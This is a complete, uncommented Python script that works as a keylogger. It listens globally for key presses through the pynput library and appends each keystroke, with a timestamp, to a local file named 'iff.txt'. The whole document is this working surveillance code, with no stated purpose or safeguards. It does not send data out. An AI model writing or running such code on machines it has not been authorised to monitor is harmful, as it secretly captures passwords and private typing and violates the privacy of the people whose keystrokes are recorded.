import datetime
import pynput.keyboard

def log_keyboard_input(key):
    with open("iff.txt", "a") as f:
        key_time = str(datetime.datetime.now())
        key_info = str(key).replace("'", "")
        f.write(f"{key_time}: {key_info}\n")

def start_keyboard_logger():
    keyboard_listener = pynput.keyboard.Listener(on_press=log_keyboard_input)
    keyboard_listener.start()
    keyboard_listener.join()

if __name__ == "__main__":
    start_keyboard_logger()